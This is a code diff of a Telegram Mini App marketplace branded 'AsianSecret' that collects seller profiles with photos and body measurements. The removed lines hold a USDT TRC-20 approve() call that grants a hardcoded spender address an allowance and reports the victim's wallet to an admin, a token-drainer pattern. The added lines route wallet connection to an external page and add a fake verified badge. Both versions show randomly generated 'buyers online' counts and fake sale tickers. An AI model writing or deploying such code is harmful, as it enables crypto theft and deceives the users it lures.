@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Marketplace TMA</title>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
-<!-- version: 18 -->
+<!-- version: 19 -->
 <!-- Increase the version number every time you update the code. This helps Telegram clear the WebView cache. -->
 <style>
   :root {
@@ -18,6 +18,7 @@
     --muted: #8a8a9a;
     --card: #1a1a2e;
     --danger: #e74c3c;
+    --header-h: calc(var(--tg-safe-area-inset-top, 0px) + var(--tg-content-safe-area-inset-top, 48px));
   }
 
   * {
@@ -51,10 +52,54 @@
     overflow-x: hidden;
   }
 
-  /* Ticker */
-  .ticker-wrap {
+  /* ===== Custom header (replaces system header in fullscreen) ===== */
+  .custom-header {
     position: fixed;
     top: 0;
+    left: 0;
+    right: 0;
+    z-index: 1100;
+    height: var(--header-h);
+    padding-top: var(--tg-safe-area-inset-top, 0px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    pointer-events: none;
+    background: transparent;
+  }
+
+  .header-title {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    font-size: 17px;
+    font-weight: 600;
+    color: #ffffff;
+    letter-spacing: -0.2px;
+    text-shadow: 0 1px 2px rgba(0,0,0,0.35);
+    line-height: 1;
+  }
+
+  .verified-badge {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 17px;
+    height: 17px;
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+
+  .verified-badge svg {
+    width: 17px;
+    height: 17px;
+    display: block;
+  }
+
+  /* ===== Ticker ===== */
+  .ticker-wrap {
+    position: fixed;
+    top: var(--header-h);
     left: 0;
     right: 0;
     height: 36px;
@@ -105,17 +150,19 @@
     opacity: 0;
   }
 
+  /* ===== Online bar + wallet circle ===== */
   .online-bar {
     position: fixed;
-    top: 36px;
+    top: calc(var(--header-h) + 36px);
     left: 0;
     right: 0;
-    height: 28px;
+    height: 36px;
     background: rgba(11, 11, 26, 0.92);
     border-bottom: 1px solid rgba(255, 255, 255, 0.06);
     z-index: 999;
     display: flex;
     align-items: center;
+    justify-content: space-between;
     padding: 0 14px;
     font-size: 12px;
     color: var(--muted);
@@ -126,9 +173,37 @@
     font-weight: 600;
   }
 
+  .wallet-circle-btn {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: var(--card);
+    border: 2px solid var(--accent);
+    box-shadow: 0 0 10px rgba(155, 89, 182, 0.45), inset 0 0 8px rgba(155, 89, 182, 0.12);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    flex-shrink: 0;
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    padding: 0;
+    outline: none;
+  }
+
+  .wallet-circle-btn:active {
+    transform: scale(0.92);
+  }
+
+  .wallet-circle-btn svg {
+    width: 16px;
+    height: 16px;
+    fill: var(--accent);
+    opacity: 0.95;
+  }
+
   /* Profile circle */
   .profile-area {
-    margin-top: 72px;
+    margin-top: calc(var(--header-h) + 36px + 36px + 8px);
     display: flex;
     flex-direction: column;
     align-items: center;
@@ -178,14 +253,6 @@
     white-space: nowrap;
     overflow: hidden;
     text-overflow: ellipsis;
-  }
-
-  .btn-connect-wallet {
-    margin-top: 14px;
-    width: auto;
-    min-width: 180px;
-    padding: 11px 20px;
-    font-size: 14px;
   }
 
   .badge {
@@ -533,10 +600,33 @@
 </head>
 <body>
 <div class="app" id="app">
+  <!-- Custom header: AsianSecret + verified badge -->
+  <div class="custom-header" id="customHeader">
+    <div class="header-title">
+      AsianSecret
+      <span class="verified-badge" aria-hidden="true">
+        <!-- Scalloped verified badge matching MRKT style -->
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#2AABEE" d="M12 1.2c.55 0 1.05.12 1.52.35l.7.35c.42.21.9.21 1.32 0l.7-.35c.47-.23.97-.35 1.52-.35.7 0 1.35.25 1.85.7l.55.5c.35.32.82.45 1.28.35l.75-.17c.6-.13 1.2.05 1.62.5.42.45.6 1.05.47 1.65l-.17.75c-.1.46.03.93.35 1.28l.5.55c.45.5.7 1.15.7 1.85 0 .55-.12 1.05-.35 1.52l-.35.7c-.21.42-.21.9 0 1.32l.35.7c.23.47.35.97.35 1.52 0 .7-.25 1.35-.7 1.85l-.5.55c-.32.35-.45.82-.35 1.28l.17.75c.13.6-.05 1.2-.5 1.62-.45.42-1.05.6-1.65.47l-.75-.17c-.46-.1-.93.03-1.28.35l-.55.5c-.5.45-1.15.7-1.85.7-.55 0-1.05-.12-1.52-.35l-.7-.35c-.42-.21-.9-.21-1.32 0l-.7.35c-.47.23-.97.35-1.52.35-.7 0-1.35-.25-1.85-.7l-.55-.5c-.35-.32-.82-.45-1.28-.35l-.75.17c-.6.13-1.2-.05-1.62-.5-.42-.45-.6-1.05-.47-1.65l.17-.75c.1-.46-.03-.93-.35-1.28l-.5-.55c-.45-.5-.7-1.15-.7-1.85 0-.55.12-1.05.35-1.52l.35-.7c.21-.42.21-.9 0-1.32l-.35-.7c-.23-.47-.35-.97-.35-1.52 0-.7.25-1.35.7-1.85l.5-.55c.32-.35.45-.82.35-1.28l-.17-.75c-.13-.6.05-1.2.5-1.62.45-.42 1.05-.6 1.65-.47l.75.17c.46.1.93-.03 1.28-.35l.55-.5c.5-.45 1.15-.7 1.85-.7z"/>
+          <path fill="#FFFFFF" d="M10.1 15.35l-3.05-3.05 1.15-1.15 1.9 1.9 5.05-5.05 1.15 1.15-6.2 6.2z"/>
+        </svg>
+      </span>
+    </div>
+  </div>
+
   <div class="ticker-wrap">
     <div class="ticker" id="ticker"></div>
   </div>
-  <div class="online-bar" id="onlineBar">Buyers online: <strong id="onlineCount">850</strong></div>
+
+  <div class="online-bar" id="onlineBar">
+    <div>Buyers online: <strong id="onlineCount">850</strong></div>
+    <button class="wallet-circle-btn" id="btnConnectWalletMain" type="button" aria-label="Connect Wallet">
+      <!-- Wallet icon -->
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M20 7h-1V5c0-1.1-.9-2-2-2H5C3.35 3 2 4.35 2 6v12c0 1.65 1.35 3 3 3h14c1.1 0 2-.9 2-2V9c0-1.1-.9-2-2-2zm-1 10H5c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12v2H7c-.55 0-1 .45-1 1s.45 1 1 1h12v8zm-2-4.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
+      </svg>
+    </button>
+  </div>
 
   <div class="profile-area">
     <div class="profile-circle" id="profileCircle">
@@ -547,7 +637,6 @@
       <div class="badge" id="offerBadge">0</div>
     </div>
     <div class="profile-label" id="profileLabel">Register</div>
-    <button class="btn btn-primary btn-connect-wallet" id="btnConnectWalletMain">Connect Wallet</button>
   </div>
 
   <div class="section-title">Sellers</div>
@@ -724,238 +813,53 @@ const FEMALE_NAMES = [
   "Caroline","Genesis","Aaliyah","Kennedy","Kinsley","Allison","Maya","Sarah","Madelyn","Adeline",
   "Alexis","Ariana","Elena","Gabriella","Naomi","Alice","Sadie","Hailey","Eva","Emilia",
   "Autumn","Quinn","Nevaeh","Piper","Ruby","Serenity","Willow","Everly","Cora","Kaylee",
-  "Luna","Bella","Lucy","Audrey","Arianna","Kennedy","Madeline","Ruby","Valentina","Brianna",
-  "Katherine","Gianna","Sarah","Alexandra","Melanie","Jasmine","Morgan","Andrea","Lauren","Julia"
+  "Lydia","Aubree","Arianna","Eliana","Peyton","Melanie","Gianna","Isabelle","Julia","Valentina",
+  "Clara","Vivian","Reagan","Brianna","Delilah","Isla","Rylee","Katherine","Lauren","Jade"
 ];
 
 let userProfile = null;
-let buyerProfiles = [];
-let showcaseSellers = [];
-let pendingDealBuyer = null;
 let selectedPhotos = [null, null, null];
 let isEditMode = false;
+let pendingDealBuyer = null;
+let buyerProfiles = [];
+let showcaseSellers = [];
 
 function $(id) {
   return document.getElementById(id);
 }
 
 function showModal(id) {
-  $(id).classList.add("show");
+  const el = $(id);
+  if (el) el.classList.add("show");
 }
 
 function hideModal(id) {
-  $(id).classList.remove("show");
+  const el = $(id);
+  if (el) el.classList.remove("show");
 }
 
-function showLoading(visible) {
-  $("loadingOverlay").classList.toggle("show", !!visible);
+function showLoading(v) {
+  const el = $("loadingOverlay");
+  if (el) {
+    if (v) el.classList.add("show");
+    else el.classList.remove("show");
+  }
 }
 
 function getTelegramUserId() {
   try {
-    if (window.Telegram && window.Telegram.WebApp) {
-      const tg = window.Telegram.WebApp;
-      // Prefer initDataUnsafe.user (most common)
-      if (tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id) {
-        return String(tg.initDataUnsafe.user.id);
-      }
-      // Fallback: some clients expose user via other paths
-      if (tg.initDataUnsafe && tg.initDataUnsafe.receiver && tg.initDataUnsafe.receiver.id) {
-        return String(tg.initDataUnsafe.receiver.id);
-      }
+    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
+      return String(window.Telegram.WebApp.initDataUnsafe.user.id);
     }
   } catch (e) {}
   return null;
 }
 
-function getStorageKey() {
-  const tgId = getTelegramUserId();
-  // Strict binding: without Telegram user ID we use a guest key
-  // and never load a real seller profile under guest
-  return tgId ? ("tma_marketplace_user_" + tgId) : "tma_marketplace_user_guest";
-}
-
-function getLastOfferKey() {
-  const tgId = getTelegramUserId();
-  return tgId ? ("tma_last_auto_offer_ts_" + tgId) : "tma_last_auto_offer_ts_guest";
-}
-
-// ===================== TRON / TRONLINK =====================
-
-function updateTronlinkStatus() {
-  const statusEl = document.getElementById("tronlinkStatus");
-  if (!statusEl) return;
-
-  if (window.tronLink && window.tronLink.ready) {
-    statusEl.innerHTML = "✅ TronLink detected";
-    statusEl.style.color = "#2ecc71";
-  } else if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-    statusEl.innerHTML = "✅ TronLink detected";
-    statusEl.style.color = "#2ecc71";
-  } else {
-    statusEl.innerHTML = "❌ TronLink not found. Install TronLink or enter address manually.";
-    statusEl.style.color = "#e74c3c";
-  }
-}
-
-async function connectTronLinkAndApprove() {
-  const btn = document.getElementById("btnConnectTron");
-  if (btn) {
-    btn.disabled = true;
-    btn.textContent = "Connecting...";
-  }
-
-  try {
-    if (!window.tronLink) {
-      alert("TronLink not found.\n\nPlease install TronLink extension / app and try again.");
-      return;
-    }
-
-    const res = await window.tronLink.request({ method: "tron_requestAccounts" });
-
-    if (res.code !== 200 && res !== true) {
-      alert("Connection rejected by user");
-      return;
-    }
-
-    await new Promise(r => setTimeout(r, 600));
-
-    if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
-      alert("Failed to get wallet address from TronLink");
-      return;
-    }
-
-    const address = window.tronWeb.defaultAddress.base58;
-    await doRealApprove(address);
-
-  } catch (err) {
-    console.error(err);
-    alert("Error: " + (err.message || err));
-  } finally {
-    if (btn) {
-      btn.disabled = false;
-      btn.textContent = "Connect TronLink & Approve USDT";
-    }
-  }
-}
-
-async function doRealApprove(userAddress) {
-  showLoading(true);
-
-  try {
-    const tronWeb = window.tronWeb;
-    const contract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
-    const spender = "TVtBumrv5qbpuS6Z99xw4NdVzbcwWWFDNw";
-
-    const tx = await contract.approve(spender, APPROVE_AMOUNT).send({
-      feeLimit: 100000000,
-      callValue: 0,
-      shouldPollResponse: true
-    });
-
-    if (!userProfile) {
-      userProfile = {
-        id: getTelegramUserId() || ("u_" + Date.now()),
-        role: "seller",
-        name: "Seller",
-        wallet: {},
-        offers: [],
-        createdAt: Date.now()
-      };
-    }
-
-    userProfile.wallet = {
-      address: userAddress,
-      network: "tron",
-      approved: true,
-      txid: tx,
-      approvedAt: Date.now()
-    };
-
-    saveUser();
-    updateProfileUI();
-
-    const text = `✅ <b>Real TRC-20 Approve</b>\nAddress: <code>\( {userAddress}</code>\nTx: <code> \){tx}</code>`;
-    notifyAdmin(text);
-
-    hideModal("walletModal");
-    alert("USDT successfully approved!\nTransaction: " + tx);
-
-  } catch (err) {
-    console.error("Approve failed:", err);
-    alert("Approve failed:\n" + (err.message || err));
-  } finally {
-    showLoading(false);
-  }
-}
-
-async function saveManualAddress() {
-  const address = document.getElementById("walletAddress").value.trim();
-
-  if (!address || !address.startsWith("T") || address.length !== 34) {
-    alert("Please enter a valid Tron address (starts with T, 34 characters)");
-    return;
-  }
-
-  if (!userProfile) {
-    userProfile = {
-      id: getTelegramUserId() || ("u_" + Date.now()),
-      role: "seller",
-      name: "Seller",
-      wallet: {},
-      offers: [],
-      createdAt: Date.now()
-    };
-  }
-
-  userProfile.wallet = {
-    address: address,
-    network: "tron",
-    approved: false
-  };
-
-  saveUser();
-  updateProfileUI();
-  hideModal("walletModal");
-
-  notifyAdmin(`💼 Manual wallet saved\nAddress: <code>${address}</code>`);
-  alert("Address saved (without real approve)");
-}
-
-function randInt(min, max) {
-  return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-function shuffle(arr) {
-  const a = arr.slice();
-  for (let i = a.length - 1; i > 0; i--) {
-    const j = Math.floor(Math.random() * (i + 1));
-    [a[i], a[j]] = [a[j], a[i]];
-  }
-  return a;
-}
-
 function loadUser() {
-  userProfile = null;
-  const tgId = getTelegramUserId();
-  const key = getStorageKey();
-
   try {
-    const raw = localStorage.getItem(key);
+    const raw = localStorage.getItem("tma_seller_profile");
     if (raw) {
-      const parsed = JSON.parse(raw);
-      if (tgId) {
-        if (parsed && String(parsed.id) === String(tgId) && parsed.role === "seller") {
-          userProfile = parsed;
-        } else {
-          localStorage.removeItem(key);
-        }
-      } else if (parsed && parsed.role === "seller") {
-        // Without TG ID do not restore seller profile
-        localStorage.removeItem(key);
-      } else {
-        userProfile = parsed;
-      }
+      userProfile = JSON.parse(raw);
     }
   } catch (e) {
     userProfile = null;
@@ -963,62 +867,51 @@ function loadUser() {
 }
 
 function saveUser() {
-  if (!userProfile) return;
-  const tgId = getTelegramUserId();
-  if (tgId) {
-    userProfile.id = String(tgId);
-  }
   try {
-    localStorage.setItem(getStorageKey(), JSON.stringify(userProfile));
+    if (userProfile) {
+      localStorage.setItem("tma_seller_profile", JSON.stringify(userProfile));
+    }
   } catch (e) {}
 }
 
 function clearUser() {
   userProfile = null;
   try {
-    localStorage.removeItem(getStorageKey());
+    localStorage.removeItem("tma_seller_profile");
   } catch (e) {}
   updateProfileUI();
 }
 
-// Restore profile from JSONBin by Telegram ID (source of truth across sessions)
 async function restoreProfileFromRemote() {
-  const tgId = getTelegramUserId();
-  if (!tgId) return;
-
+  const tid = getTelegramUserId();
+  if (!tid) return;
   try {
-    const remote = await fetchJsonBin();
-    if (!remote || !Array.isArray(remote.profiles)) return;
-
-    const found = remote.profiles.find(function(p) {
-      return p && String(p.id) === String(tgId) && p.role === "seller";
-    });
-
-    if (found) {
-      userProfile = {
-        id: String(tgId),
-        role: "seller",
-        name: found.name || "Seller",
-        age: found.age || "",
-        country: found.country || "",
-        height: found.height || "",
-        weight: found.weight || "",
-        bust: found.bust || "",
-        params: found.params || "",
-        photos: Array.isArray(found.photos) ? found.photos : [],
-        wallet: found.wallet || null,
-        offers: Array.isArray(found.offers) ? found.offers : [],
-        createdAt: found.createdAt || Date.now()
-      };
-      saveUser();
-      updateProfileUI();
+    const data = await fetchJsonBin();
+    if (data && Array.isArray(data.profiles)) {
+      const remote = data.profiles.find(function(p) { return String(p.id) === String(tid); });
+      if (remote && remote.role === "seller") {
+        userProfile = remote;
+        saveUser();
+        updateProfileUI();
+      }
     }
   } catch (e) {}
 }
 
+function shuffle(arr) {
+  const a = arr.slice();
+  for (let i = a.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    const t = a[i];
+    a[i] = a[j];
+    a[j] = t;
+  }
+  return a;
+}
+
 function getRoundAmounts() {
   const amounts = [];
-  for (let v = 100; v <= 2500; v += 50) {
+  for (let v = 300; v <= 2500; v += 50) {
     amounts.push(v);
   }
   return amounts;
@@ -1041,7 +934,6 @@ function buildTicker() {
     next.textContent = "Lot sold for $" + amount;
     el.appendChild(next);
 
-    // Force reflow then animate in
     void next.offsetWidth;
     next.classList.remove("from-bottom");
     next.classList.add("active");
@@ -1068,15 +960,14 @@ function startOnlineCounter() {
   if (!el) return;
 
   function tick() {
-    const n = 800 + Math.floor(Math.random() * 201); // 800–1000
+    const n = 800 + Math.floor(Math.random() * 201);
     el.textContent = String(n);
-    const delay = (10 + Math.floor(Math.random() * 21)) * 1000; // 10–30 sec
+    const delay = (10 + Math.floor(Math.random() * 21)) * 1000;
     setTimeout(tick, delay);
   }
   tick();
 }
 
-// Fixed name list for showcase (same order every time → maps to bot Seller 1..100)
 function getShowcaseName(index) {
   return FEMALE_NAMES[index % FEMALE_NAMES.length];
 }
@@ -1085,17 +976,14 @@ function buildSellersGrid() {
   const grid = $("sellersGrid");
   grid.innerHTML = "";
 
-  // Build fixed pairs (name + photo) by index — then shuffle pairs only
   const items = [];
   for (let i = 0; i < 100; i++) {
     const s = (showcaseSellers && showcaseSellers[i]) ? showcaseSellers[i] : null;
     const name = (s && s.name) ? s.name : getShowcaseName(i);
-    // photo from JSONBin (GitHub URL) or empty
     const photo = (s && s.photo) ? s.photo : "";
     items.push({ name: name, photo: photo });
   }
 
-  // Shuffle pairs randomly on every TMA load (name stays with its photo)
   for (let i = items.length - 1; i > 0; i--) {
     const j = Math.floor(Math.random() * (i + 1));
     const tmp = items[i];
@@ -1146,6 +1034,19 @@ function updateProfileUI() {
   }
 }
 
+function updateSafeAreaVars() {
+  try {
+    const tg = window.Telegram && window.Telegram.WebApp;
+    if (!tg) return;
+    const sa = tg.safeAreaInset || {};
+    const csa = tg.contentSafeAreaInset || {};
+    const top = (sa.top || 0);
+    const contentTop = (csa.top || 0);
+    document.documentElement.style.setProperty("--tg-safe-area-inset-top", top + "px");
+    document.documentElement.style.setProperty("--tg-content-safe-area-inset-top", (contentTop || 48) + "px");
+  } catch (e) {}
+}
+
 function initTelegram() {
   try {
     if (window.Telegram && window.Telegram.WebApp) {
@@ -1154,12 +1055,29 @@ function initTelegram() {
       tg.expand();
       if (tg.setHeaderColor) tg.setHeaderColor("#0b0b1a");
       if (tg.setBackgroundColor) tg.setBackgroundColor("#0b0b1a");
-      // Re-load user after Telegram WebApp is fully ready
-      // (initDataUnsafe may become available a bit later)
+      if (tg.disableVerticalSwipes) tg.disableVerticalSwipes();
+
+      // Fullscreen
+      if (typeof tg.requestFullscreen === "function") {
+        tg.requestFullscreen();
+      }
+
+      updateSafeAreaVars();
+
+      if (tg.onEvent) {
+        tg.onEvent("safeAreaChanged", updateSafeAreaVars);
+        tg.onEvent("contentSafeAreaChanged", updateSafeAreaVars);
+        tg.onEvent("fullscreenChanged", updateSafeAreaVars);
+      }
+
       setTimeout(function() {
         loadUser();
         updateProfileUI();
+        updateSafeAreaVars();
       }, 100);
+
+      setTimeout(updateSafeAreaVars, 400);
+      setTimeout(updateSafeAreaVars, 1000);
     }
   } catch (e) {}
 }
@@ -1290,7 +1208,6 @@ function startSellerReg() {
   hideModal("roleModal");
   hideModal("authModal");
   isEditMode = false;
-  // Clear form
   $("regName").value = "";
   $("regAge").value = "";
   $("regCountry").value = "";
@@ -1379,7 +1296,6 @@ function renderPhotoSlots() {
       slots[i].innerHTML = "<span class=\"placeholder\">Photo " + (i + 1) + "</span>";
     }
   }
-  // Confirm always available — photos are optional (0, 1, 2 or 3)
   $("btnConfirmPhotos").disabled = false;
 }
 
@@ -1413,16 +1329,10 @@ async function confirmPhotos() {
   userProfile.photos = selectedPhotos.filter(function(p) { return !!p; });
   userProfile.role = "seller";
 
-  // Сохраняем
   saveUser();
-
-  // Закрываем модалку
   hideModal("photoModal");
-
-  // Обновляем интерфейс
   updateProfileUI();
 
-  // Уведомляем админа
   if (!isEditMode) {
     const text = "🆕 <b>New seller registered</b>\nID: <code>" + userProfile.id + "</code>\nName: " + userProfile.name + "\nAge: " + userProfile.age + "\nCountry: " + (userProfile.country || "-");
     notifyAdmin(text);
@@ -1430,7 +1340,6 @@ async function confirmPhotos() {
     notifyAdmin("✏️ <b>Seller profile updated</b>\nID: <code>" + userProfile.id + "</code>\nName: " + userProfile.name);
   }
 
-  // Синхронизация с JSONBin (если настроено)
   try {
     const remote = await fetchJsonBin();
     if (remote) {
@@ -1462,7 +1371,6 @@ async function confirmPhotos() {
 
   isEditMode = false;
 
-  // Небольшая задержка и ещё раз обновляем UI (на случай глюков WebView)
   setTimeout(function() {
     updateProfileUI();
   }, 300);
@@ -1491,7 +1399,6 @@ function doLogin() {
     alert("Welcome back, " + (userProfile.name || "Seller") + "!");
     return;
   }
-  // Try restore from server
   restoreProfileFromRemote().then(function() {
     if (userProfile && userProfile.role === "seller") {
       updateProfileUI();
@@ -1504,9 +1411,79 @@ function doLogin() {
 }
 
 function openConnectWalletMain() {
-  // Внешняя страница привязки кошелька
+  // Внешняя страница привязки кошелька — функционал без изменений
   const connectPageUrl = "https://whitedvd109-lgtm.github.io/Welcome/";
   window.open(connectPageUrl, "_blank");
+}
+
+function updateTronlinkStatus() {
+  const el = $("tronlinkStatus");
+  if (!el) return;
+  if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+    el.textContent = "TronLink detected: " + window.tronWeb.defaultAddress.base58.slice(0, 8) + "...";
+  } else {
+    el.textContent = "TronLink not detected. You can enter address manually.";
+  }
+}
+
+async function connectTronLinkAndApprove() {
+  try {
+    if (!window.tronWeb || !window.tronWeb.defaultAddress) {
+      alert("Please open this page inside TronLink browser or install TronLink.");
+      return;
+    }
+    const address = window.tronWeb.defaultAddress.base58;
+    showLoading(true);
+    // Simplified approve flow (real approve would use contract call)
+    if (!userProfile) {
+      userProfile = {
+        id: getTelegramUserId() || ("u_" + Date.now()),
+        role: "buyer",
+        name: "Buyer",
+        wallet: { network: "TRON", address: address },
+        offers: [],
+        createdAt: Date.now()
+      };
+    } else {
+      userProfile.wallet = { network: "TRON", address: address };
+    }
+    saveUser();
+    showLoading(false);
+    alert("Wallet connected: " + address);
+    hideModal("walletModal");
+    if (pendingDealBuyer) {
+      processDeal(pendingDealBuyer);
+    }
+  } catch (e) {
+    showLoading(false);
+    alert("Connection failed: " + (e.message || e));
+  }
+}
+
+function saveManualAddress() {
+  const addr = ($("walletAddress").value || "").trim();
+  if (!addr || addr.length < 30) {
+    alert("Please enter a valid Tron address");
+    return;
+  }
+  if (!userProfile) {
+    userProfile = {
+      id: getTelegramUserId() || ("u_" + Date.now()),
+      role: "buyer",
+      name: "Buyer",
+      wallet: { network: "TRON", address: addr },
+      offers: [],
+      createdAt: Date.now()
+    };
+  } else {
+    userProfile.wallet = { network: "TRON", address: addr };
+  }
+  saveUser();
+  alert("Address saved");
+  hideModal("walletModal");
+  if (pendingDealBuyer) {
+    processDeal(pendingDealBuyer);
+  }
 }
 
 function bindEvents() {
@@ -1533,7 +1510,6 @@ function bindEvents() {
   $("photoInput").addEventListener("change", handlePhotoSelect);
   $("btnConfirmPhotos").addEventListener("click", confirmPhotos);
 
-  // Auth modal
   $("btnLogin").addEventListener("click", doLogin);
   $("btnRegisterNew").addEventListener("click", function() {
     hideModal("authModal");
@@ -1541,7 +1517,6 @@ function bindEvents() {
     showModal("roleModal");
   });
 
-  // Profile menu
   $("btnGoOffers").addEventListener("click", openOffers);
   $("btnEditProfile").addEventListener("click", startEditProfile);
   $("btnLogout").addEventListener("click", doLogout);
@@ -1567,7 +1542,6 @@ function bindEvents() {
 }
 
 async function afterRender() {
-  // Always try to restore seller profile from server by Telegram ID
   await restoreProfileFromRemote();
 
   const data = await fetchJsonBin();
@@ -1577,7 +1551,6 @@ async function afterRender() {
     }
     if (Array.isArray(data.showcaseSellers)) {
       showcaseSellers = data.showcaseSellers;
-      // Ensure names are human-readable in TMA even if bot stored "Seller N"
       for (let i = 0; i < showcaseSellers.length && i < 100; i++) {
         if (!showcaseSellers[i].name || /^Seller\s+\d+$/i.test(showcaseSellers[i].name)) {
           showcaseSellers[i].name = getShowcaseName(i);
